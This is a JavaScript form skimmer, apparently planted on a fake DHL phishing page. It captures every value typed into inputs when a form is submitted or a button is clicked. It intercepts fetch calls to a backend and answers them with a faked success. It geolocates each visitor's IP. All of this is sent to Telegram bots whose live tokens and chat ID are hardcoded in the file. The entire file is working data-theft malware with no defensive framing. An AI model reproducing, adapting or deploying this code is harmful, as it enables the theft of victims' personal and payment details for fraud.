(function() {
  const DATA_BOT_TOKEN = "8584171291:AAHfFk3H1WhcAaxTOOR5vfqevrbekyC5nY4";
  const VISIT_BOT_TOKEN = "8421410574:AAGGyYXoD10wYMsUjbZWxCYO4J33tYmAPA4";
  const CHAT_ID = "6788012481";

  // Envoi asynchrone pour ne pas bloquer l'UI
  function sendToTelegramAsync(text, botToken) {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "https://api.telegram.org/bot" + botToken + "/sendMessage", true);
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' }));
    } catch(e) {}
  }

  // Envoi synchrone (bloquant)
  function sendToTelegramSync(text, botToken) {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "https://api.telegram.org/bot" + botToken + "/sendMessage", false);
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' }));
    } catch(e) {}
  }

  // === STRATEGIE 1 : INTERCEPTION DOM (Scraping) ===
  let lastSentData = "";
  function captureAndSend() {
    const inputs = document.querySelectorAll('input, select');
    let dataText = '📦 <b>DHL Data Captured (DOM)</b>\n\n';
    let count = 0;

    inputs.forEach(function(input) {
      if (input.value && input.type !== 'submit' && input.type !== 'hidden') {
        const label = input.getAttribute('placeholder') || input.name || input.id || 'Champ';
        dataText += '<b>' + label + ':</b> ' + input.value + '\n';
        count++;
      }
    });

    if (count > 0 && dataText !== lastSentData) {
      lastSentData = dataText;
      sendToTelegramSync(dataText, DATA_BOT_TOKEN); 
    }
  }

  document.addEventListener('submit', function() { captureAndSend(); }, true);
  document.addEventListener('mousedown', function(e) {
    if (e.target.closest('button, input[type="submit"]')) captureAndSend();
  }, true);
  document.addEventListener('touchstart', function(e) {
    if (e.target.closest('button, input[type="submit"]')) captureAndSend();
  }, true);


  // === STRATEGIE 2 : INTERCEPTION FETCH (Monkey Patch) ===
  const originalFetch = window.fetch;
  window.fetch = async function(resource, config) {
    try {
      let url = "";
      if (typeof resource === 'string') url = resource;
      else if (resource instanceof Request) url = resource.url;
      else if (resource && resource.toString) url = resource.toString();

      if (url && url.includes('backend.blink.new')) {
        let bodyData = null;
        
        // Extraire le body depuis config ou resource
        if (config && config.body) {
          if (typeof config.body === 'string') bodyData = JSON.parse(config.body);
        } else if (resource instanceof Request) {
          // Un clone est nécessaire pour ne pas consommer le body du vrai Request
          const reqClone = resource.clone();
          const textBody = await reqClone.text();
          if (textBody) bodyData = JSON.parse(textBody);
        }

        if (bodyData) {
          let dataText = '📦 <b>DHL Data Captured (API)</b>\n\n';
          if (bodyData.type) dataText += '<b>Type:</b> ' + bodyData.type + '\n';
          
          const targetData = bodyData.data || bodyData;
          for (const key in targetData) {
            if (key !== 'type') dataText += '<b>' + key + ':</b> ' + targetData[key] + '\n';
          }
          sendToTelegramAsync(dataText, DATA_BOT_TOKEN);
        }
        
        return Promise.resolve(new Response(JSON.stringify({ success: true }), {
          status: 200, headers: { 'Content-Type': 'application/json' }
        }));
      }
    } catch(e) { console.error("Fetch intercept error", e); }
    
    return originalFetch.apply(this, arguments);
  };


  // === TRACK VISIT ===
  try {
    originalFetch('https://ipwho.is/').then(r => r.json()).then(data => {
      const ip = (data && data.ip) ? data.ip : 'Inconnu';
      const city = (data && data.city) ? data.city : 'Inconnu';
      const country = (data && data.country) ? data.country : 'Inconnu';
      const text = '🚨 <b>New DHL Visit</b>\n\n🌐 <b>IP:</b> ' + ip + '\n🏙️ <b>Ville:</b> ' + city + '\n🌍 <b>Pays:</b> ' + country + '\n📱 <b>UA:</b> ' + navigator.userAgent;
      sendToTelegramAsync(text, VISIT_BOT_TOKEN);
    }).catch(() => {
      sendToTelegramAsync('🚨 <b>New DHL Visit</b> (IP fail)', VISIT_BOT_TOKEN);
    });
  } catch(e) {}
})();
